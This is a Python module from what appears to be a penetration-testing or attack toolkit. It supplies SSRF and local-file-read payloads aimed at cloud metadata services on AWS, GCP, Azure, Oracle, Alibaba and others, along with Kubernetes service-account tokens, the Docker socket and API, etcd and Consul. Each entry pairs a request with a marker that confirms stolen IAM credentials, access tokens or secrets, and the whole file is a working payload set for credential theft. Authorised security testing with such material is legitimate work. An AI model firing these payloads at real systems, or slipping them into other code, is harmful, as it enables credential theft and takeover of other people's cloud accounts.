"""
Cloud-metadata probing helpers.

When an SSRF or path-traversal lands, the highest-impact follow-up is
reaching a cloud instance metadata service (IMDS) and extracting short-
lived credentials.

This module provides modern, defence-aware probes for every major
provider — including IMDSv2 on AWS (which requires a token *first*),
the `Metadata-Flavor: Google` header on GCP, the audience parameter on
Azure, and Kubernetes service-account tokens via in-cluster paths.

Used by:
  - data/pro_attacks/ssrf.py — confirm SSRF impact via metadata reach
  - data/pro_attacks/path_traversal.py — read kube/SA tokens via LFI
  - data/pro_attacks/information_disclosure.py — fingerprint cloud env

Each probe returns:
    {
      "provider": "aws|gcp|azure|oracle|alibaba|do|hetzner|k8s|docker",
      "url":      "...",
      "headers":  {...},
      "method":   "GET",
      "marker":   "what to look for in tool output to confirm reach",
      "severity": "critical|high|medium",
      "purpose":  "human-readable description",
    }

Probes are passive: they describe *what to send* and *what marker*
indicates a hit. The caller (an attack script) is responsible for
delivering the URL through the target's vulnerable parameter and
inspecting the response.
"""

from __future__ import annotations


def aws_probes() -> list[dict]:
    return [
        {
            "provider": "aws", "url": "http://169.254.169.254/latest/api/token",
            "method": "PUT",
            "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            "marker": "AQAEA",   # IMDSv2 tokens start with this
            "severity": "high",
            "purpose": "AWS IMDSv2 — fetch session token (required on hardened EC2)",
        },
        {
            "provider": "aws",
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "method": "GET", "headers": {},
            "marker": "AccessKeyId",
            "severity": "critical",
            "purpose": "AWS IMDSv1 IAM role credentials (legacy, often still enabled)",
        },
        {
            "provider": "aws",
            "url": "http://169.254.169.254/latest/meta-data/iam/info",
            "method": "GET", "headers": {},
            "marker": "InstanceProfileArn",
            "severity": "high",
            "purpose": "AWS IAM role / instance profile fingerprint",
        },
        {
            "provider": "aws",
            "url": "http://169.254.169.254/latest/user-data/",
            "method": "GET", "headers": {},
            "marker": "#!",   # user-data scripts often start with shebang
            "severity": "high",
            "purpose": "AWS user-data (cloud-init scripts, sometimes secrets)",
        },
        {
            "provider": "aws",
            "url": "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "method": "GET", "headers": {},
            "marker": "accountId",
            "severity": "medium",
            "purpose": "AWS instance identity document (account ID, region, AMI)",
        },
    ]


def gcp_probes() -> list[dict]:
    base = "http://metadata.google.internal/computeMetadata/v1"
    h = {"Metadata-Flavor": "Google"}
    return [
        {
            "provider": "gcp",
            "url": f"{base}/instance/service-accounts/default/token",
            "method": "GET", "headers": dict(h),
            "marker": "access_token",
            "severity": "critical",
            "purpose": "GCP service-account access token",
        },
        {
            "provider": "gcp",
            "url": f"{base}/project/project-id",
            "method": "GET", "headers": dict(h),
            "marker": "",
            "severity": "low",
            "purpose": "GCP project ID fingerprint",
        },
        {
            "provider": "gcp",
            "url": f"{base}/instance/attributes/?recursive=true",
            "method": "GET", "headers": dict(h),
            "marker": "",
            "severity": "high",
            "purpose": "GCP instance attributes (often holds startup-script secrets)",
        },
        {
            "provider": "gcp",
            "url": f"{base}/instance/service-accounts/default/identity"
                   "?audience=https://example.com",
            "method": "GET", "headers": dict(h),
            "marker": "eyJ",   # JWT base64 prefix
            "severity": "high",
            "purpose": "GCP identity token (workload-identity JWT)",
        },
    ]


def azure_probes() -> list[dict]:
    return [
        {
            "provider": "azure",
            "url": "http://169.254.169.254/metadata/identity/oauth2/token"
                   "?api-version=2018-02-01"
                   "&resource=https://management.azure.com/",
            "method": "GET",
            "headers": {"Metadata": "true"},
            "marker": "access_token",
            "severity": "critical",
            "purpose": "Azure managed-identity token for ARM",
        },
        {
            "provider": "azure",
            "url": "http://169.254.169.254/metadata/identity/oauth2/token"
                   "?api-version=2018-02-01"
                   "&resource=https://vault.azure.net",
            "method": "GET",
            "headers": {"Metadata": "true"},
            "marker": "access_token",
            "severity": "critical",
            "purpose": "Azure managed-identity token for Key Vault",
        },
        {
            "provider": "azure",
            "url": "http://169.254.169.254/metadata/instance"
                   "?api-version=2021-02-01",
            "method": "GET",
            "headers": {"Metadata": "true"},
            "marker": "subscriptionId",
            "severity": "medium",
            "purpose": "Azure instance metadata (subscription ID, region, VM size)",
        },
    ]


def oracle_probes() -> list[dict]:
    return [
        {
            "provider": "oracle",
            "url": "http://169.254.169.254/opc/v2/identity/cert.pem",
            "method": "GET",
            "headers": {"Authorization": "Bearer Oracle"},
            "marker": "BEGIN CERTIFICATE",
            "severity": "high",
            "purpose": "OCI instance principal cert (auth artefact)",
        },
        {
            "provider": "oracle",
            "url": "http://169.254.169.254/opc/v2/instance/",
            "method": "GET",
            "headers": {"Authorization": "Bearer Oracle"},
            "marker": "compartmentId",
            "severity": "medium",
            "purpose": "OCI instance metadata",
        },
    ]


def alibaba_probes() -> list[dict]:
    return [
        {
            "provider": "alibaba",
            "url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "method": "GET", "headers": {},
            "marker": "AccessKeyId",
            "severity": "critical",
            "purpose": "Alibaba Cloud RAM credentials",
        },
    ]


def digitalocean_probes() -> list[dict]:
    return [
        {
            "provider": "do",
            "url": "http://169.254.169.254/metadata/v1/user-data",
            "method": "GET", "headers": {},
            "marker": "#!",
            "severity": "high",
            "purpose": "DigitalOcean user-data",
        },
    ]


def hetzner_probes() -> list[dict]:
    return [
        {
            "provider": "hetzner",
            "url": "http://169.254.169.254/hetzner/v1/metadata/private-networks",
            "method": "GET", "headers": {},
            "marker": "ip",
            "severity": "low",
            "purpose": "Hetzner Cloud private-network metadata",
        },
    ]


def kubernetes_probes() -> list[dict]:
    return [
        {
            "provider": "k8s",
            "url": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
            "method": "GET", "headers": {},
            "marker": "eyJ",
            "severity": "critical",
            "purpose": "K8s in-pod service-account JWT (file:// SSRF or LFI)",
        },
        {
            "provider": "k8s",
            "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
            "method": "GET", "headers": {"Accept": "application/json"},
            "marker": "SecretList",
            "severity": "critical",
            "purpose": "K8s API server secrets (requires SA token bound)",
        },
        {
            "provider": "k8s",
            "url": "http://127.0.0.1:10255/pods",
            "method": "GET", "headers": {},
            "marker": "PodList",
            "severity": "high",
            "purpose": "Kubelet read-only port (legacy, often still open)",
        },
    ]


def container_runtime_probes() -> list[dict]:
    return [
        {
            "provider": "docker",
            "url": "http://127.0.0.1:2375/containers/json",
            "method": "GET", "headers": {},
            "marker": "Image",
            "severity": "critical",
            "purpose": "Docker remote API (port 2375 unauthenticated)",
        },
        {
            "provider": "docker",
            "url": "unix:///var/run/docker.sock",
            "method": "GET", "headers": {},
            "marker": "",
            "severity": "critical",
            "purpose": "Docker socket via Unix-socket SSRF",
        },
        {
            "provider": "etcd",
            "url": "http://127.0.0.1:2379/v2/keys/?recursive=true",
            "method": "GET", "headers": {},
            "marker": "createdIndex",
            "severity": "critical",
            "purpose": "etcd cluster KV dump",
        },
        {
            "provider": "consul",
            "url": "http://127.0.0.1:8500/v1/kv/?recurse",
            "method": "GET", "headers": {},
            "marker": "ModifyIndex",
            "severity": "high",
            "purpose": "Consul KV store enumeration",
        },
    ]


_ALL = {
    "aws": aws_probes,
    "gcp": gcp_probes,
    "azure": azure_probes,
    "oracle": oracle_probes,
    "alibaba": alibaba_probes,
    "do": digitalocean_probes,
    "hetzner": hetzner_probes,
    "k8s": kubernetes_probes,
    "container": container_runtime_probes,
}


def all_probes(*, providers: list[str] | None = None,
               severities: list[str] | None = None) -> list[dict]:
    """Return every probe matching the filters.

    ``providers``: subset of {aws,gcp,azure,oracle,alibaba,do,hetzner,k8s,container}.
        Empty / None = all.
    ``severities``: subset of {critical,high,medium,low}. Empty = all.
    """
    keys = providers or list(_ALL.keys())
    sev = set(severities) if severities else None
    out: list[dict] = []
    for k in keys:
        fn = _ALL.get(k)
        if not fn:
            continue
        for p in fn():
            if sev and p.get("severity") not in sev:
                continue
            out.append(p)
    return out


def detect_provider_from_text(text: str) -> str | None:
    """Cheap fingerprint — given any tool output, guess which provider's
    metadata service replied (used to label findings)."""
    if not text:
        return None
    t = text.lower()
    if "x-aws-ec2-metadata-token" in t or "ami-" in t or "instance-identity" in t:
        return "aws"
    if "metadata.google.internal" in t or "computemetadata" in t \
            or "metadata-flavor" in t:
        return "gcp"
    if "subscriptionid" in t and ("vmsize" in t or "azureenvironment" in t):
        return "azure"
    if "compartmentid" in t and "opc-" in t:
        return "oracle"
    if "kubernetes.io" in t or "serviceaccount" in t:
        return "k8s"
    return None


__all__ = [
    "aws_probes", "gcp_probes", "azure_probes", "oracle_probes",
    "alibaba_probes", "digitalocean_probes", "hetzner_probes",
    "kubernetes_probes", "container_runtime_probes",
    "all_probes", "detect_provider_from_text",
]
